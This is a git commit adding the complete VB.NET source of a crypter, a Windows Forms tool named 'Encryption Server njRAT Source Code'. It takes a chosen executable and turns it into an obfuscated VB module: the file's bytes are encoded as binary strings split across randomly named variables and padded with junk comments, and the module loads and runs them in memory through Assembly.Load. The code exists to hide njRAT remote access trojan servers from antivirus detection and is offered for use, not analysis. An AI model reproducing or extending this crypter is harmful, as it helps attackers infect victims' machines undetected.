b235476f16b07b1ba51c70a8ba4b207ae139f2ba
noradlb1 <zcyfkhuru.bz@mail.ru>
2021-12-27 05:57:17 +0100

    Encryption Server njRAT SRC Code
    Encryption Server njRAT SRC Code

---
+++ Crypter/Form1.Designer.vb
@@ -0,0 +1,218 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.RichTextBox1 = New System.Windows.Forms.RichTextBox()
+        Me.L1 = New System.Windows.Forms.TextBox()
+        Me.Button2 = New System.Windows.Forms.Button()
+        Me.L2 = New System.Windows.Forms.TextBox()
+        Me.Button3 = New System.Windows.Forms.Button()
+        Me.Button4 = New System.Windows.Forms.Button()
+        Me.Button5 = New System.Windows.Forms.Button()
+        Me.E2 = New System.Windows.Forms.TextBox()
+        Me.E1 = New System.Windows.Forms.TextBox()
+        Me.XD = New System.Windows.Forms.Timer(Me.components)
+        Me.SuspendLayout()
+        '
+        'Button1
+        '
+        Me.Button1.BackColor = System.Drawing.Color.Black
+        Me.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.Button1.ForeColor = System.Drawing.Color.MediumSpringGreen
+        Me.Button1.Location = New System.Drawing.Point(5, 4)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(75, 23)
+        Me.Button1.TabIndex = 0
+        Me.Button1.Text = "Opan"
+        Me.Button1.UseVisualStyleBackColor = False
+        '
+        'TextBox1
+        '
+        Me.TextBox1.BackColor = System.Drawing.SystemColors.WindowText
+        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.TextBox1.ForeColor = System.Drawing.Color.White
+        Me.TextBox1.Location = New System.Drawing.Point(86, 4)
+        Me.TextBox1.Multiline = True
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(343, 23)
+        Me.TextBox1.TabIndex = 1
+        Me.TextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'RichTextBox1
+        '
+        Me.RichTextBox1.BackColor = System.Drawing.SystemColors.WindowText
+        Me.RichTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.RichTextBox1.Font = New System.Drawing.Font("Tahoma", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
+        Me.RichTextBox1.ForeColor = System.Drawing.Color.Lime
+        Me.RichTextBox1.Location = New System.Drawing.Point(-4, 60)
+        Me.RichTextBox1.Name = "RichTextBox1"
+        Me.RichTextBox1.Size = New System.Drawing.Size(433, 395)
+        Me.RichTextBox1.TabIndex = 2
+        Me.RichTextBox1.Text = ""
+        '
+        'L1
+        '
+        Me.L1.BackColor = System.Drawing.Color.Black
+        Me.L1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.L1.ForeColor = System.Drawing.Color.White
+        Me.L1.Location = New System.Drawing.Point(329, 31)
+        Me.L1.Multiline = True
+        Me.L1.Name = "L1"
+        Me.L1.Size = New System.Drawing.Size(47, 23)
+        Me.L1.TabIndex = 4
+        '
+        'Button2
+        '
+        Me.Button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.Button2.ForeColor = System.Drawing.Color.Crimson
+        Me.Button2.Location = New System.Drawing.Point(167, 31)
+        Me.Button2.Name = "Button2"
+        Me.Button2.Size = New System.Drawing.Size(75, 23)
+        Me.Button2.TabIndex = 5
+        Me.Button2.Text = "Delete"
+        Me.Button2.UseVisualStyleBackColor = True
+        '
+        'L2
+        '
+        Me.L2.BackColor = System.Drawing.Color.Black
+        Me.L2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.L2.ForeColor = System.Drawing.Color.White
+        Me.L2.Location = New System.Drawing.Point(382, 31)
+        Me.L2.Multiline = True
+        Me.L2.Name = "L2"
+        Me.L2.Size = New System.Drawing.Size(47, 23)
+        Me.L2.TabIndex = 6
+        '
+        'Button3
+        '
+        Me.Button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.Button3.ForeColor = System.Drawing.Color.Crimson
+        Me.Button3.Location = New System.Drawing.Point(248, 31)
+        Me.Button3.Name = "Button3"
+        Me.Button3.Size = New System.Drawing.Size(75, 23)
+        Me.Button3.TabIndex = 7
+        Me.Button3.Text = "Module.vb"
+        Me.Button3.UseVisualStyleBackColor = True
+        '
+        'Button4
+        '
+        Me.Button4.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.Button4.ForeColor = System.Drawing.Color.Crimson
+        Me.Button4.Location = New System.Drawing.Point(86, 31)
+        Me.Button4.Name = "Button4"
+        Me.Button4.Size = New System.Drawing.Size(75, 23)
+        Me.Button4.TabIndex = 8
+        Me.Button4.Text = "Copy"
+        Me.Button4.UseVisualStyleBackColor = True
+        '
+        'Button5
+        '
+        Me.Button5.FlatStyle = System.Windows.Forms.FlatStyle.Flat
+        Me.Button5.ForeColor = System.Drawing.Color.Crimson
+        Me.Button5.Location = New System.Drawing.Point(5, 31)
+        Me.Button5.Name = "Button5"
+        Me.Button5.Size = New System.Drawing.Size(75, 23)
+        Me.Button5.TabIndex = 9
+        Me.Button5.Text = "Encryption"
+        Me.Button5.UseVisualStyleBackColor = True
+        '
+        'E2
+        '
+        Me.E2.BackColor = System.Drawing.SystemColors.WindowText
+        Me.E2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.E2.ForeColor = System.Drawing.Color.YellowGreen
+        Me.E2.Location = New System.Drawing.Point(5, 238)
+        Me.E2.Multiline = True
+        Me.E2.Name = "E2"
+        Me.E2.Size = New System.Drawing.Size(412, 191)
+        Me.E2.TabIndex = 19
+        Me.E2.Text = "Dim $f$ = """"" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "For Each $ff$ In Split($S$, ""$s$"")" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "$f$ += ChrW(Convert.ToInt32($ff" & _
+            "$, 2))" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Next" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Assembly.Load(Convert.FromBase64String($f$)).EntryPoint.Invoke(Not" & _
+            "hing, Nothing)" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "End Sub" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "End Module"
+        Me.E2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        Me.E2.Visible = False
+        '
+        'E1
+        '
+        Me.E1.BackColor = System.Drawing.Color.Black
+        Me.E1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.E1.ForeColor = System.Drawing.Color.Yellow
+        Me.E1.Location = New System.Drawing.Point(5, 78)
+        Me.E1.Multiline = True
+        Me.E1.Name = "E1"
+        Me.E1.ReadOnly = True
+        Me.E1.Size = New System.Drawing.Size(412, 154)
+        Me.E1.TabIndex = 18
+        Me.E1.Text = "Imports System.Reflection" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Module Module1" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Dim $S$ As String = Nothing" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Sub Main" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10)
+        Me.E1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        Me.E1.Visible = False
+        '
+        'XD
+        '
+        Me.XD.Enabled = True
+        Me.XD.Interval = 20
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink
+        Me.BackColor = System.Drawing.SystemColors.ControlText
+        Me.ClientSize = New System.Drawing.Size(430, 454)
+        Me.Controls.Add(Me.RichTextBox1)
+        Me.Controls.Add(Me.E2)
+        Me.Controls.Add(Me.E1)
+        Me.Controls.Add(Me.Button5)
+        Me.Controls.Add(Me.Button4)
+        Me.Controls.Add(Me.Button3)
+        Me.Controls.Add(Me.L2)
+        Me.Controls.Add(Me.Button2)
+        Me.Controls.Add(Me.L1)
+        Me.Controls.Add(Me.TextBox1)
+        Me.Controls.Add(Me.Button1)
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.MaximizeBox = False
+        Me.Name = "Form1"
+        Me.Text = "Encryption Server njRAT Source Code"
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+    Friend WithEvents Button1 As System.Windows.Forms.Button
+    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
+    Friend WithEvents RichTextBox1 As System.Windows.Forms.RichTextBox
+    Friend WithEvents L1 As System.Windows.Forms.TextBox
+    Friend WithEvents Button2 As System.Windows.Forms.Button
+    Friend WithEvents L2 As System.Windows.Forms.TextBox
+    Friend WithEvents Button3 As System.Windows.Forms.Button
+    Friend WithEvents Button4 As System.Windows.Forms.Button
+    Friend WithEvents Button5 As System.Windows.Forms.Button
+    Friend WithEvents E2 As System.Windows.Forms.TextBox
+    Friend WithEvents E1 As System.Windows.Forms.TextBox
+    Friend WithEvents XD As System.Windows.Forms.Timer
+
+End Class
---
+++ Crypter/Form1.vb
@@ -0,0 +1,91 @@
+﻿Imports System, System.IO, System.Collections.Generic
+Imports System.Drawing, System.Drawing.Drawing2D
+Imports System.ComponentModel, System.Windows.Forms
+Imports System.IO.Compression
+Imports Microsoft.VisualBasic.CompilerServices
+Imports System.Runtime.CompilerServices
+Imports System.Security.Cryptography
+Imports System.Text
+Public Class Form1
+
+    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
+        Dim m As New OpenFileDialog
+        m.Filter = "Application *.exe|*.exe"
+        m.Title = "Select"
+        If m.ShowDialog = DialogResult.OK Then TextBox1.Text = m.FileName
+    End Sub
+
+    Private Sub XD_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles XD.Tick
+        L1.Text = RN() : L2.Text = "2" & RNN(2, "123456")
+    End Sub
+    Function RN() As String
+        Randomize()
+        t = New Random
+        s = ""
+        Dim k As String
+        k = "!/*-;,?µ£=)@\[{~"
+        s += k(t.Next(0, k.Length))
+        Return s
+    End Function
+    Dim t As Random : Dim s As String
+    Function RNN(ByVal l As Integer, ByVal k As String) As String
+        Randomize()
+        t = New Random
+        s = ""
+        For i = 1 To l
+            s += k(t.Next(0, k.Length))
+        Next
+        Return s
+    End Function
+    Function Crypt(ByVal w As String)
+        Dim bui As New System.Text.StringBuilder
+        For i = 0 To w.Length - 1
+            bui.Append(Convert.ToString(CLng(Asc(w.Substring(i, 1))), 2) & L1.Text)
+        Next
+        Return bui.ToString.Remove(bui.ToString.Length - 1, 1)
+    End Function
+    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
+        If TextBox1.Text = "" Then Exit Sub
+        If Dir(TextBox1.Text) = "" Then MsgBox("( " & TextBox1.Text & " ) Invalid File !", MsgBoxStyle.Critical) : Exit Sub
+        Dim q As String = RNN(15, "劳是英说肉自说会想伏乓是问年英的语仰方那动想是非动是表道动语")
+        RichTextBox1.Text = E1.Text.Replace("$S$", q)
+        Dim xw As String = Crypt(Convert.ToBase64String((IO.File.ReadAllBytes(TextBox1.Text))))
+        Dim x As Integer = 0
+        For i As Integer = 1 To Int(L2.Text) - (xw.Length Mod Int(L2.Text))
+            x += 1
+        Next
+        Dim w2 As String = xw.Substring(xw.Length - x, x)
+        Dim w1 As String = xw.Substring(0, xw.Length - x)
+        Dim bui As New System.Text.StringBuilder
+        Dim co As String
+        For j As Integer = 1 To w1.Length Step Int(L2.Text)
+            co = Mid(w1, j, Int(L2.Text))
+            bui.Append(q & " += " & Chr(34) & co & Chr(34) & vbNewLine & "'" & RNN(120, co) & vbNewLine)
+        Next
+        bui.Append(q & " += " & Chr(34) & w2 & Chr(34) & vbNewLine)
+        RichTextBox1.Text += bui.ToString
+        Dim z1 As String = RNN(9, "劳是英说肉自说会想伏乓是问年英的语仰方那动想是非动是表道动语")
+        Dim z2 As String = RNN(10, "劳是英说肉自说会想伏乓是问年英的语仰方那动想是非动是表道动语")
+        RichTextBox1.Text += E2.Text.Replace("$f$", z1).Replace("$ff$", z2).Replace("$S$", q).Replace("$s$", L1.Text)
+    End Sub
+
+    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
+        If RichTextBox1.Text = "" Then Exit Sub
+        Clipboard.SetText(RichTextBox1.Text)
+        MsgBox("Copy", MsgBoxStyle.Information)
+    End Sub
+
+    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
+        Dim sfd As New SaveFileDialog
+        sfd.Filter = "Visual Basic File|*.vb"
+        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
+            File.WriteAllText(sfd.FileName, RichTextBox1.Text)
+            MsgBox("Save" & sfd.FileName, MsgBoxStyle.Information, "Information")
+        End If
+    End Sub
+
+    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
+        RichTextBox1.Text = ""
+        MsgBox("Copy", MsgBoxStyle.Information)
+    End Sub
+End Class
